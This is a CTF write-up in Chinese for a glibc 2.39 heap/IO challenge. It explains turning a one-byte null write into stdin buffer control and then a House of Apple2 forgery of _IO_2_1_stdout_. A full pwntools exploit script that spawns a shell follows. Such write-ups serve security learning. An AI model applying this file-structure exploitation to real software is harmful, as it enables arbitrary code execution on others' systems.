## Nullullullllu

挺有意思的一道题，不过出得比较直白所以难度不大。

在 2.39 版本的 glibc 下，题目给出了 libc 基地址和一次任意地址写一字节 0 的能力，这对于利用而言远远不够，寻找能拓展为任意地址任意写的方法。

题目读入数据用的是循环 `getchar()`，调试发现读入的字节也是存在 `_IO_2_1_stdin_` 提供的缓冲区上的，取决于 file 结构体中的一系列指针，但是一次写一字节 0 显然是无法做到同时修改多个地址的，进一步调试发现在函数调用栈 `_IO_default_uflow+50 -> _IO_file_underflow+287 -> _IO_switch_to_get_mode+81` 中会逐一将 `_IO_buf_base` 的地址赋给所需的三个指针，因此题目的一字节写 0 应该用在修改 `_IO_2_1_stdin_.file._IO_buf_base` 末尾一字节上。

于是输入缓冲区被劫持到了 `_IO_write_base` 的位置，可以故技重施，但是这时候就能写入多字节任意数据了：

1. 这里最好的办法就是转而去劫持 `_IO_2_1_stdout_` 结构体打 House of Apple2；
2. 但是泄漏 environ + ROP 应该永远是可行的打法，只不过这里多次写入是个问题，可以从地址更低的 `_IO_2_1_stdin_` 开始写，保留任意地址写的能力的同时改后面的 `_IO_2_1_stdout_` 来泄漏，最后再改到栈上打 ROP，理论上可行不过挺麻烦的。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


cmd(1)
ru(b"libc_base = ")
libc_base = set_current_libc_base_and_log(int(ru(b"\n", drop=True), 16))

cmd(2)
sl(hex(libc.sym._IO_2_1_stdin_ + 0x38).encode())


def cmd(data):
    ru(b"> ")
    sl(data)


cmd(
    flat(
        {
            0x00: [
                libc.sym._IO_2_1_stdout_ - 8,
                libc.sym._IO_2_1_stdout_ - 8,
                libc.sym._IO_2_1_stdout_ - 8 + 0x200,
                libc.sym._IO_2_1_stdout_ - 8,
                libc.sym._IO_2_1_stdout_ - 8 + 0x200,
                0,
                0,
                0,
                0,
            ],
        },
        word_size=64,
    )
)

A_addr = libc.sym._IO_2_1_stdout_
B_addr = libc.sym._IO_2_1_stdout_
apple2 = flat(
    {
        0x8: {
            0x00: b"  sh;",
            0x18: [0],
            0x30: [0],
            0x68: [libc.sym.system],
            0x88: [libc_base + 0x205700],  # lock
            0xA0: [A_addr],
            0xD8: [libc.sym._IO_wfile_jumps],
            0xE0: [B_addr],
        }
    },
    filler=b"\x00",
    word_size=64,
)
cmd(apple2)

ia()
```
